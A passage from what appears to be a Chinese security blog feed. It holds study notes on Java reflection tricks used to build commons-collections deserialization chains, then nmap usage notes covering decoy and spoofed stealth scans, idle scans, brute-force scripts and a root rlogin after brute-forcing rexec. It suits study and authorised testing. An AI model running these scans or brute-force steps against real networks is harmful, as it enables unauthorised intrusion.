rel="noopener">简书</a></p><h2 id="从commons-collections回来的invoke性质补充说明"><a href="#从commons-collections回来的invoke性质补充说明" class="headerlink" title="从commons-collections回来的invoke性质补充说明"></a>从commons-collections回来的invoke性质补充说明</h2><p>一直以来我们都看到这种反射机制的调用来获取Runtime类的实例：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))</span><br></pre></td></tr></table></figure></p><p>看到这个例子，我们可能会固定思维的误解：<br>我们从哪个类中获取方法，在invoke中就应该传入哪个类或这个类的实例（上面说过，这个需要根据方法来定）</p><p>我们从源码来看一下Method类中的invoke函数的输入输出说明：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* <span class="meta">@param</span> obj  the object the underlying method is invoked from<span class="comment">//调用基础方法的对象</span></span><br><span class="line">* <span class="meta">@param</span> args the arguments used <span class="keyword">for</span> the method call<span class="comment">//调用这个方法的传参</span></span><br><span class="line">* <span class="meta">@return</span> the result of dispatching the method represented by<span class="comment">//调用这个方法的返回结果</span></span><br><span class="line">* <span class="keyword">this</span> object on &#123;<span class="meta">@code</span> obj&#125; with parameters</span><br></pre></td></tr></table></figure></p><p>来对照普通调用语句和反射语句之间的对应关系，这里前后两个class都是相同的Runtime class</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7btssl3pdj319206d0t7.jpg" alt="invoke实质.png"></p><p>那么讲道理一般的调用，默认我们的固定思维惯性，也不会有什么问题，因为选中一个类的方法自然是应该传入这个类的实例或这个类。<br>直到出现一些意外：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不要把下面的语句当作反射机制，就当作Runtime.getRuntime()是一个普通函数调用</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(...)</span><br><span class="line">Class.forName(<span class="string">"java.lang.Class"</span>).getMethod(...)</span><br><span class="line"><span class="comment">//好比有一个函数可以在两个class中调用</span></span><br><span class="line">a.getMethod()</span><br><span class="line">b.getMethod()</span><br></pre></td></tr></table></figure></p><p>如上我们一直忽略了我们反射机制中调用的函数实际上可以在不同的class中调用，这一点在commons-collections中十分关键：<br>由于当时的环境<br>不允许我们得到<code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(...)</code><br>只有<code>Class.forName(&quot;java.lang.Class&quot;).getMethod(...)</code></p><p>那么我们可以得到以下途径进行变形：</p><ul><li>用反射机制去调用反射机制中使用的函数getMethod</li><li>使用invoke传入的obj去指定getMethod的当前的调用环境（在实际代码执行中是this变量的区别）</li></ul><p>看一看Class类中getMethod方法的接口<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Method <span class="title">getMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span><span class="comment">//&lt;?&gt;... 表示任意类型任意数量的Class数组</span></span></span><br></pre></td></tr></table></figure></p><p>改成反射机制，得到getMethod这个方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Method method1= Class.forName(<span class="string">"java.lang.Class"</span>)</span><br><span class="line">        .getMethod(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;);<span class="comment">//根据getMethod方法接口进行封装</span></span><br></pre></td></tr></table></figure></p><p>指定obj：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以下语句执行结果等同于Class.forName("java.lang.Runtime").getMethod(getRunime)</span></span><br><span class="line">method1.invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//用于对比：以下语句等同于Class.forName("java.lang.Class").getMethod(getRunime)</span></span><br><span class="line"><span class="comment">//method1.invoke(Class.forName("java.lang.Class"),"getRuntime",new Class[0]);</span></span><br></pre></td></tr></table></figure></p><p>合起来就是<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反射调用</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>)</span><br><span class="line"><span class="comment">// 经过变形的反射调用</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Class"</span>)</span><br><span class="line">    .getMethod(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;)<span class="comment">//得到getMethod方法</span></span><br><span class="line">    .invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure></p><p>现在我们只是以<code>Class.forName(&quot;java.lang.Class&quot;)</code>开头获取到了Runtime类下的getRuntime方法。还没有执行。</p><h3 id="invoke-静态方法的obj不那么严格"><a href="#invoke-静态方法的obj不那么严格" class="headerlink" title="invoke 静态方法的obj不那么严格"></a>invoke 静态方法的obj不那么严格</h3><p>在调用invoke执行前，还需要讲另一个invoke非常神奇的特性，不那么严格校验的obj。<br>回顾之前总结的invoke传参规则：</p><blockquote><p>它的第一个参数是执行method的对象obj：</p><ul><li>如果这个方法是一个普通方法，那么第一个参数是类对象 </li><li>如果这个方法是一个静态方法，那么第一个参数是类<br>它接下来的参数才是需要传入的参数。</li></ul></blockquote><p>传入的第一个参数其实不一定要是正确的类或者类对象!<br>看一下例子：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main函数</span></span><br><span class="line">Class.forName(<span class="string">"a"</span>).getMethod(<span class="string">"print"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line"><span class="comment">//内部类：</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>按照规则，print函数是一个静态方法，实际上我们应该invoke传入一个a的类。但是以上代码的执行结果却是成功的：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7btszlp40j31ag0l6758.jpg" alt="invoke_obj不严格.png"></p><p>但是print不是静态方法时就会执行失败：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7btt38lc2j314u0nk0tx.jpg" alt="invoke_obj不严格_非startic.png"></p><p>这是因为invoke函数null抛出报错的机制导致的：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* <span class="meta">@exception</span> NullPointerException      </span><br><span class="line">* <span class="keyword">if</span> the specified object is <span class="keyword">null</span> and the method is an instance method. <span class="comment">//obj为null，并且method是一个实例method</span></span><br><span class="line">*/</span><br><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object obj, Object... args)</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当method是一个普通函数时，传入obj不能为null，并且其类对象要与方法匹配<br>但是当method是一个静态函数时，就很随便了(可能是因为压根不会被用到吧)。</p><p>那么我们在调用getMethod的时候可不可以皮一下呢？<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method method = (Method) Class.forName(<span class="string">"java.lang.Class"</span>)</span><br><span class="line">    .getMethod(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;)<span class="comment">//得到getMethod方法</span></span><br><span class="line">    .invoke(<span class="keyword">null</span>,<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);<span class="comment">//这里invoke传入null</span></span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7btt9pcpvj31lq0bqabr.jpg" alt="getMethod_null.png"></p><p>报错自然是因为getMethod并不是static方法,所以不能为null了。<br>但是为什么getMethod不是static方法，但是invoke中却传入类而不是类实例呢……..<br>我是没有搞懂这个问题….但是感觉是因为是反射机制的函数的问题。由于已经花了太多时间，就不在这里继续纠结了。</p><blockquote><p>感谢潘大佬，点醒了；其实是看p牛的反射篇产生的误解，上文中所说的类，其实也是一个实例。类实例是其他类的实例，类实际上是class这个类的实例。<br>这边之前的疑问是，getMethod不是静态方法而invoke中传入的是类而不是类实例。<br>实际上因为getMethod本来就是class类中的方法，而<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>获取到的class类的实例<br>我们调用getMethod传入的不是之前的模糊类的概念，而是class类的实例（类实例），所以这里是没毛病的调用class类下的非静态方法，传入class类实例。</p></blockquote><p>但是Runtime.getRuntime就不一样了：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object object0 = Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.String"</span>));</span><br><span class="line">Object object1 = Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">Object object2 = Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7bttfgc0dj31v20j40vy.jpg" alt="getRuntime_null.png"></p><p>突出一个随便，随性。</p><h3 id="回来继续构造调用"><a href="#回来继续构造调用" class="headerlink" title="回来继续构造调用"></a>回来继续构造调用</h3><p>上面我们只是获取到了getRuntime方法，我们还没有调用这个方法获取其Runtime对象<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//普通调用形式</span></span><br><span class="line">Runtime.getRuntime()</span><br><span class="line"><span class="comment">// 反射调用</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))</span><br><span class="line"><span class="comment">// 经过变形的反射调用</span></span><br><span class="line">Method method = (Method) Class.forName(<span class="string">"java.lang.Class"</span>)</span><br><span class="line">                .getMethod(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;)<span class="comment">//得到getMethod方法</span></span><br><span class="line">                .invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);<span class="comment">//调用getMethod方法</span></span><br><span class="line"><span class="comment">//以上等于执行Class.forName("java.lang.Runtime").getMethod("getRuntime")</span></span><br><span class="line"><span class="comment">//调用Runtime.getRuntime函数，传入的obj根据上面的分析可以随便写</span></span><br><span class="line">method.invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">method.invoke(<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">method.invoke(Class.forName(<span class="string">"java.lang.String"</span>),<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure></p><p>至此，我们就换了一种方式去获取Runtime实例。<br>当然最后的getRuntime函数我们是直接反射调用的，在实际commons-collections利用中我们仍然需要跟得到getMethod一样用反射机制去获取invoke，然后再调用。<br>虽然在这里觉得1+1的问题为什么要1+1000-1000+1，兜兜转转挺傻乎乎的。但是在利用链的场景下，就会觉得：</p><p>卧槽….这个POC作者真是个人才。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>反射机制参考：<br><a href="https://www.cnblogs.com/wglIT/p/7590468.html" target="_blank" rel="noopener">https://www.cnblogs.com/wglIT/p/7590468.html</a><br><a href="https://www.cnblogs.com/yrstudy/p/6500982.html" target="_blank" rel="noopener">https://www.cnblogs.com/yrstudy/p/6500982.html</a><br>P神-java安全漫谈-反射机制1（知识星球-代码审计）<br>P神-java安全漫谈-反射机制2（知识星球-代码审计）<br>P神-java安全漫谈-反射机制3（知识星球-代码审计）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;java反射机制&quot;&gt;&lt;a href=&quot;#java反射机制&quot; class=&quot;headerlink&quot; title=&quot;java反射机制&quot;&gt;&lt;/a&gt;java反射机制&lt;/h2&gt;&lt;p&gt;真正反序列化漏洞的利用，还需要了解java反射原理。因为java反序列化的payload大多
      
    
    </summary>
    
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Tools-nmap使用</title>
    <link href="http://lalajun.com/2018/09/26/Tools-nmap/"/>
    <id>http://lalajun.com/2018/09/26/Tools-nmap/</id>
    <published>2018-09-26T09:05:28.000Z</published>
    <updated>2019-10-14T06:18:08.528Z</updated>
    
    <content type="html"><![CDATA[<p>— 总归是要补的…. —<br>— 终于补了一波自动化工具的使用 —</p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>入职回头好好学习大把工具。<br>nmap基础学习笔记，感觉复习了计算机网络一样…<br>笔记笔记，常回来看看。<br>关于到script功能，和一些觉得不常用的功能，就没有记录了。</p><h2 id="官网中文文档"><a href="#官网中文文档" class="headerlink" title="官网中文文档"></a>官网中文文档</h2><p><a href="http://www.nmap.com.cn/doc/manual.shtm" target="_blank" rel="noopener">官网中文文档</a><br><a href="https://nmap.org/book/toc.html" target="_blank" rel="noopener">官网教程书籍</a></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>1.扫描网段在线主机：<br><code>nmap -sP 192.168.0.0/24</code><br>2.扫描主机端口：<br><code>nmap -sS -P0 -sV -O 192.168.0.1</code> <code>nmap –PN –sT –sV –p1-65535 www.xxx.com</code><br>3.简单粗暴全扫(默认-sT)：<br><code>nmap -A -sV -T4 192.168.0.1</code><br>4.隐蔽扫描：<br><code>nmap --spoof-mac Cisco --data-length 24 -T paranoid -max-hostgroup 1 --max-parallelism 10 -Pn -f -D 10.1.20.5,RND:5,ME -v -n -sS -sV -p T:1-1024 -oA ./out 10.1.1.15</code></p><h2 id="脚本使用"><a href="#脚本使用" class="headerlink" title="脚本使用"></a>脚本使用</h2><h3 id="脚本类别扫描"><a href="#脚本类别扫描" class="headerlink" title="脚本类别扫描"></a>脚本类别扫描</h3><p>nmap脚本可以进行分类扫描<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">auth: 负责处理鉴权证书（绕开鉴权）的脚本  </span><br><span class="line">broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务  </span><br><span class="line">brute: 提供暴力破解方式，针对常见的应用如http/snmp等  </span><br><span class="line"><span class="keyword">default</span>: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力  </span><br><span class="line">discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等  </span><br><span class="line">dos: 用于进行拒绝服务攻击  </span><br><span class="line">exploit: 利用已知的漏洞入侵系统  </span><br><span class="line">external: 利用第三方的数据库或资源，例如进行whois解析  </span><br><span class="line">fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽  </span><br><span class="line">malware: 探测目标机是否感染了病毒、开启了后门等信息  </span><br><span class="line">safe: 此类与intrusive相反，属于安全性脚本  </span><br><span class="line">version: 负责增强服务与版本扫描（Version Detection）功能的脚本  </span><br><span class="line">vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</span><br></pre></td></tr></table></figure></p><p>扫描常见弱口令：<br><code>nmap --script=auth 192.168.137.*</code><br>对于各种端口进行简单爆破：<br><code>nmap --script=brute 192.168.137.*</code><br>扫描常见漏洞<br><code>nmap --script=vuln 10.71.144.3</code><br>局域网嗅探<br><code>nmap -n -p445 --script=broadcast 192.168.137.4</code><br>512端口开启rexecd Service服务的进行爆破<br><code>nmap -p 512 --script rexec-brute 10.71.144.3</code></p><blockquote><p>rexeced Service爆破结束后进行利用<code>apt-get install rsh-client</code> <code>rlogin -l root 192.168.10.92</code></p></blockquote><h2 id="目标地址"><a href="#目标地址" class="headerlink" title="目标地址"></a>目标地址</h2><h3 id="CIDR风格的地址"><a href="#CIDR风格的地址" class="headerlink" title="CIDR风格的地址"></a>CIDR风格的地址</h3><p><code>192.168.10.0/24</code>  = <code>192.168.10.0/24</code> = <code>192.168.10.0</code>-<code>192.168.10.255</code></p><p>根据IP地址的32个比特位固定，替换后面的比特位。可以从<code>/1</code>(半个互联网)到<code>/32</code>(一个主机)</p><h3 id="指定范围"><a href="#指定范围" class="headerlink" title="- 指定范围"></a>- 指定范围</h3><p><code>192.168.0-255.1-254</code> = C端下面所有地址，除了0,255<br><code>0-255.0-255.13.37</code> = 所有以13.37结束的地址。</p><h3 id="选项控制"><a href="#选项控制" class="headerlink" title="选项控制"></a>选项控制</h3><p><code>-iL &lt;inputfilename&gt;</code> (从列表中输入)<br>inputfilename：文件，文件内地址每一项必须以一个或多个空格，制表符或换行符分开</p><p><code>-iR &lt;hostnum&gt;</code> (随机选择目标)<br>hostnum：随机生成的IP数量，0表示无穷</p><p><code>--exclude &lt;host1[，host2][，host3]，...&gt;</code> (排除主机/网络) </p><p><code>--excludefile &lt;excludefile&gt;</code> (排除文件中的列表) </p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><blockquote><p>-sP选项可以和 除-P0之外的任何发现探测类型-P* 选项结合使用以达到更大的灵活性。 一旦使用了任何探测类型和端口选项，默认的探测(ACK和回应请求)就被覆盖了。</p></blockquote><p><code>-sL</code> (列表扫描)：<br>列出指定网络上的每台主机， 不发送任何报文到目标主机。再反向域名解析以获取 它们的名字。</p><p><code>-sP</code> (Ping扫描)：<br>打印出对Ping扫描做出响应的那些主机。 没有进一步的测试 (如端口扫描或者操作系统探测)。<br>在默认情况下， 发送一个ICMP回声请求和一个TCP报文到80端口。</p><p><code>-P0/-Pn</code> (无ping)：<br>完全跳过Nmap发现阶段。</p><p><code>-PS [portlist]</code> (TCP SYN Ping)：<br>该选项发送一个设置了SYN标志位的空TCP报文。 默认目的端口为80 ，也可以通过 posrlist 参数指定 一个以逗号分隔的端口列表。<br>如：-PS 22，23，25，80，113，1050，35000<br>无论对方主机端口关闭回复RST还是端口开启回复SYN/ACK响应都告诉Nmap该主机正在运行。</p><p><code>-PA [portlist]</code> (TCP ACK Ping)：<br>设置了ACK标志位的空TCP报文。其他与上相同<br>远程主机应该总是回应一个RST报文， 因为它们并没有发出过连接请求到运行Nmap的机器，如果主机正在运行的话。 </p><blockquote><p>-PS -PA 提供SYN和ACK两种ping探测，使通过防火墙的机会尽可能大。可以尝试组合使用<br>默认端口可以通过nmap.h文件修改</p></blockquote><p><code>-PU [portlist]</code> (UDP Ping)：<br>设置了空的(除非指定了–data-length)UDP报文。如果不指定端口，默认是31338，portlist 设置与上相同</p><p>如果目标机器的端口是关闭的，UDP探测应该马上得到一个ICMP端口无法到达的回应报文，意味着主机正在运行。<br>许多其它类型的ICMP错误，像主机/网络无法到达或者TTL超时 再是没有回应 表示down掉的或者不可到达的主机。</p><blockquote><p>默认31338端口是因为它是一个极不可能被服务使用的端口。大部分服务会忽略 UDP空报文而不做任何回应，会混淆判断。<br>穿越只过滤TCP的防火墙和过滤器，达到主机发现目的。</p></blockquote><p><code>-PE; -PP; -PM</code> (ICMP Ping Types)：<br><strong>-PE</strong>：发送ICMP type 8 (回声请求)报文到目标IP地址， 期待从运行的主机得到一个type 0 (回声响应)报文。表示主机正在运行<br><strong>-PP</strong>/<strong>-PM</strong>：发送ICMP 时间戳(type 13) / 地址掩码查询(type 17) 报文到目标IP地址，期待得到时间戳响应(type 14)或者地址掩码响应(type 18)，表示主机正在运行</p><blockquote><p>-PE 通常被封锁。-PP -PM 可能有效</p></blockquote><p><code>-PR</code> (ARP Ping)：<br>在局域网中，使用ARP扫描。<br>默认情况下，如果Nmap发现目标主机就在它所在的局域网上，它会进行ARP扫描。 即使指定了不同的ping类型(如 -PI或者 -PS) ，Nmap也会对任何相同局域网上的目标机使用ARP。 如果您真的不想要ARP扫描，指定 –send-ip。 </p><p><code>-n</code> (不用域名解析)<br>永不对它发现的活动IP地址进行反向域名解析。，加快速度</p><p><code>-R</code> (为所有目标解析域名)<br>永远 对目标IP地址作反向域名解析。</p><p><code>--system-dns</code> (使用系统域名解析器)<br>默认情况下，Nmap通过直接发送查询到您的主机上配置的域名服务器 来解析域名。为了提高性能，许多请求 (一般几十个 ) 并发执行。如果您希望使用系统自带的解析器，就指定该选项。</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><blockquote><p>默认使用<code>-sT</code>模式扫描</p></blockquote><p><code>-sS</code> (TCP SYN扫描)：<br>默认，快速，半开放式扫描。</p><ul><li>发送一个SYN报文，等待响应。SYN/ACK 表示端口在监听(开放)。</li><li>RST(复位)表示没有监听。</li><li>数次重发没有响应，收到ICMP不可达错误，表示被过滤</li></ul><p><code>-sT</code> (TCP connect()扫描)：<br>SYN不可用是，此为默认选项<br>完全连接到开放端口，速度慢，会留下记录。</p><p><code>-sU</code> (UDP扫描)：<br>UDP扫描较慢，比TCP更困难，扫描UDP服务<br>可以与TCP扫描 结合来使用同时检查两种协议。</p><ul><li>UDP发送空的（没有数据）UDP报头到每个目标端口。</li><li>响应UDP报文，该端口是open。</li><li>几次重试没有响应，该端口open | filtered</li><li>其他ICMP不可达错误（类型3，代码1,2,9,10,13），表示端口filtered</li><li>返回ICMP端口不可达错误（类型3，代码3），表示端口closed</li></ul><blockquote><p>比如 DNS,SNMP,DHCP(端口53,161/162,67/68)是基于UDP的服务<br><code>-sV</code>版本扫描帮助区分 open 和 filtered</p></blockquote><p><code>-sN; -sF; -sX</code> (TCP Null, FIN, and Xmas扫描)<br>如果扫描系统遵循<a href="http://www.rfc-editor.org/rfc/rfc793.txt" target="_blank" rel="noopener">TCP RFC</a>。当端口关闭时，任何不包含SYN,RST或者ACK的报文会导致 一个RST返回；当端口开放是，应该没有任何响应。<br>只要不包含SYN,RST,ACK,任何其他三种(FIN,PSH,URG)的组合都行，Nmap中提供三种扫描类型：<br><strong>Null扫描(-sN)</strong>:不设置任何标志位（TCP标志头为0）<br><strong>FIN扫描(-sF)</strong>:只设置TCP FIN标志位<br><strong>Xmas扫描(-sX)</strong>:设置FIN,PSH,URG标志位</p><p>以上三种扫描的处理都一样</p><ul><li>收到RST报文，被认为是close。 </li><li>没有响应,被认为是 open | filtered。</li><li>收到ICMP不可达错误（类型3，代号1,2,3,9,10,13)被认为是 filtered</li></ul><blockquote><p>优势：能躲过一些无状态的防火墙和报文过滤路由器，隐蔽<br>劣势：并非所有系统都严格遵守RFC 793，可能误报。不能区别open和filtered</p></blockquote><p><code>-sA</code>(TCP ACK扫描)：<br>用于发现防火墙规则，看哪些端口是被过滤的。ACK扫描探测报文只设置ACK标志位</p><ul><li>返回RST报文，被认为是unfiltered。无法细分 open | close端口</li><li>不响应的端口 或者 发送特定的ICMP错误消息（类型3，代号1,2,3,9,10,13)，被认为是 filtered</li></ul><p><code>-sW</code>(TCP窗口扫描)：<br>在ACK扫描的基础上，通过 返回的RST的报文的TCP窗口 来进一步区分 unfiltered 中的 open 和 close。</p><blockquote><p>在某些系统，开放端口用正数表示窗口大小（RST报文也是如此）而关闭端口的窗口大小为0。<br>针对这种实现而形成的扫描类型。不能总是相信，作为参考。来区分端口</p></blockquote><p><code>-sM</code>(TCP Maimon扫描)：<br>由发现者Uriel Maimon命名。<br>扫描技术与Null，FIN，以及Xmas扫描完全一致。只是修改探测报文为FIN/ACK</p><p><code>--scanflags</code> (定制的TCP扫描)：<br>允许你通过指定任意TCP标志位来设计自己的扫描发送的报文，此外设置扫描类型可以告诉Nmap如何解释响应。</p><ul><li>–scanflags URGACKPSHRSTSYNFIN 设置所有标志位</li><li>-sA 的基本类型来解析响应包（不指定，默认SYN扫描形式）</li></ul><p><code>-sl &lt;zombie host[:probeport]&gt;</code> 空闲扫描：<br>利用处于空闲状态僵尸机的IP ID增长数量来判断目标端口的开放情况。一种类似于侧信道从其他地方获取结果的攻击方式，极其隐蔽，细节参考<a href="https://nmap.org/book/idlescan.html" target="_blank" rel="noopener">官方说明</a><br>步骤如下：</p><ul><li>向zombie机器发送SYN/ACK包，目的是记录IP ID</li><li>伪造zombie机器与目标发送SYN建立连接</li><li>向zombie机器发送SYN/ACK包，目的是再次记录IP ID<br>如果IP ID 增长2 表示目标机端口open（目标机发送SYN/ACK至zombie，zombie返回RST）<br>如果IP ID 增长1 表示目标机端口close | filtered （目标机发送RST至zombie，zombie不反应）</li></ul><blockquote><p>IP ID 就是IP报文的报文头中的标识段，主机在发送报文时增长，接受报文不增长。增长2 = 1（发送至目标机） + 1（发送至攻击者主机）</p></blockquote><p><code>-sO</code> (IP协议扫描)：<br>IP协议扫描可以选择目标机支持哪些IP协议（TCP,ICMP,IGMP等）<br>遍历扫描的是协议号</p><h2 id="端口说明和扫描顺序"><a href="#端口说明和扫描顺序" class="headerlink" title="端口说明和扫描顺序"></a>端口说明和扫描顺序</h2><blockquote><p>默认情况，Nmap用指定的协议对端口1-1024以及nmap-service文件中更高的端口进行扫描。<br>默认情况下，Nmap按随机顺序扫描端口 (除了出于效率的考虑，常用的端口前移)。</p></blockquote><p><code>-p &lt;port ranges&gt;</code>(只扫描指定端口)<br>指定想要扫描的端口，覆盖默认值。<br>-p 后 可以通过<code>U:</code>,<code>T:</code>指定端口使用的协议（之前要指定-sU，和一种TCP扫描类型-sS，-sF，-sT）<br>如果不给协议限定符，会添加到所有协议列表。</p><p><code>-F</code>(快速(有限端口)扫描)：<br>扫描nmap的nmap-services文件中的指定端口。</p><p><code>-r</code>(不要按随机顺序扫描端口)：<br>顺序端口扫描。 </p><h2 id="服务和版本探测"><a href="#服务和版本探测" class="headerlink" title="服务和版本探测"></a>服务和版本探测</h2><blockquote><p>默认情况下，Nmap版本探测会跳过9100 TCP端口（打印机端口有大量无用信息）</p></blockquote><p><code>-sV</code>(版本探测)：<br>打开版本探测</p><p><code>-A</code>：<br>打开操作系统探测和版本探测</p><p><code>--allports</code>(不为版本探测排除任何端口)：<br>探测所有端口</p><p><code>--version-intensity &lt;intensity&gt;</code>(设置版本扫描强度)：<br>强度值必须在0-9之间，默认是7。指数越高，服务越可能被正确识别。<br><code>--version-light</code>(打开轻量级模式)：<br>等于 –verison-intensity 2<br><code>--verison-all</code>(尝试每个探测)：<br>等于 –version-intensity 9</p><p><code>--version-trace</code>(跟踪版本扫描活动)：<br>打印出详细正在进行的扫描调试信息。是<code>--packet-trace</code>的子集。</p><p><code>-sR</code>(RPC扫描)：<br>和许多端口扫描方法联合使用。对所有被发现开放的TCP/UDP端口，探测是否有RPC端口以及其程序和版本号。</p><h2 id="操作系统检测"><a href="#操作系统检测" class="headerlink" title="操作系统检测"></a>操作系统检测</h2><p><code>-O</code>(启动系统探测)：<br>打开系统探测</p><p><code>-A</code>：<br>打开操作系统探测和版本探测</p><p><code>--osscan-limit</code>(针对指定的目标进行操作系统探测)：<br>如果发现一个打开和关闭的TCP端口时，检测会更有效。<br>nmap只对满足这种条件的主机进行操作系统探测。</p><p><code>--osscan-guess; --fuzzy</code>(推测操作系统检测结果)</p><h2 id="时间和性能"><a href="#时间和性能" class="headerlink" title="时间和性能"></a>时间和性能</h2><p><code>-T &lt;0-5&gt;</code>(设置时间模板)：</p><p>默认为 